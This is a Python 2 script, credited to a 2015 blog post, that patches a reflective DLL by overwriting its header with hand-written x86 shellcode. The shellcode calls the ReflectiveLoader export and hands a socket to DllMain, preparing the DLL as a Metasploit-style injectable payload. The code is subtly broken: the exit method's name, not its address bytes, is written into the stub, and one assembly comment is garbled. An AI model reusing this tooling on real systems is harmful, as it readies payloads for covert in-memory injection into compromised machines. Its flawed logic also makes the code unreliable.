# http://www.shelliscoming.com/2015/05/reflectpatcherpy-python-script-to-patch_11.html
import pefile
import struct


class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[32m'
    RED = '\033[0;31m'
    DEFAULT = '\033[39m'
    ORANGE = '\033[33m'


def get_file_offset(pe):
    rva = ''
    if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
        for export in pe.DIRECTORY_ENTRY_EXPORT.symbols:
            if "ReflectiveLoader" in export.name:
                rva = export.address
                print Colors.GREEN + "[*] %s export Found! Ord:%s EntryPoint offset: %xh" % (
                    export.name, export.ordinal, rva)
                break

    if not rva:
        print Colors.RED + "[!] Reflective export function not found. You sure it's a reflective DLL?"
        restore(1)

    offset_va = rva - pe.get_section_by_rva(rva).VirtualAddress
    offset_file = offset_va + pe.get_section_by_rva(rva).PointerToRawData

    # Correct 7 bytes
    offset_file -= 7

    # Return little endian version
    return struct.pack("<I", offset_file).encode('hex')


def patch_stub(offset_file, exit_addr):
    stub = ("\x4D"  # dec ebp             ; M
            "\x5A"  # pop edx             ; Z
            "\xE8\x00\x00\x00\x00"  # call 0              ; call nexmsn ls t instruction
            "\x5B"  # pop ebx             ; get our location (+7)
            "\x52"  # push edx            ; push edx back
            "\x45"  # inc ebp             ; restore ebp
            "\x55"  # push ebp            ; save ebp
            "\x89\xE5"  # mov ebp, esp        ; setup fresh stack frame
            "\x81\xC3" + offset_file.decode('hex') +  # add ebx, 0x???????? ; add offset to ReflectiveLoader
            "\xFF\xD3"  # call ebx            ; call ReflectiveLoader
            "\x89\xC3"  # mov ebx, eax        ; save DllMain for second call
            "\x57"  # push edi            ; our socket
            "\x68\x04\x00\x00\x00"  # push 0x4            ; signal we have attached
            "\x50"  # push eax            ; some value for hinstance
            "\xFF\xD0"  # call eax            ; call DllMain( somevalue, DLL_METASPLOIT_ATTACH, socket )
            "\x68" + exit_addr +  # push 0x????????     ; our EXITFUNC placeholder
            "\x68\x05\x00\x00\x00"  # push 0x5            ; signal we have detached
            "\x50"  # push eax            ; some value for hinstance
            "\xFF\xD3")  # call ebx            ; call DllMain( somevalue, DLL_METASPLOIT_DETACH, exitfunk )
    return stub


def reflective_patcher(dll, exit_func):
    exit_method = {'thread': '\xE0\x1D\x2A\x0A', 'seh': '\xFE\x0E\x32\xEA', 'process': '\xF0\xB5\xA2\x56'}

    if exit_func not in exit_method:
        print Colors.RED + "[!] Not valid exit method: %s is not patched" % (dll)
        restore(1)

    try:
        pe = pefile.PE(dll)
    except IOError as e:
        print str(e)
        restore(1)

    offset_file = get_file_offset(pe)
    stub = patch_stub(offset_file, exit_func)

    src = file(dll, 'r+')
    payload = src.read()
    src.seek(0)
    # Reflective = Size payload + stub + (payload - stub)
    reflective_payload = struct.pack("<I", len(payload)) + stub + payload[len(stub):]

    src.write(reflective_payload)
    src.close()
    print Colors.GREEN + "[*] Patched! (%d bytes)." % (len(reflective_payload))

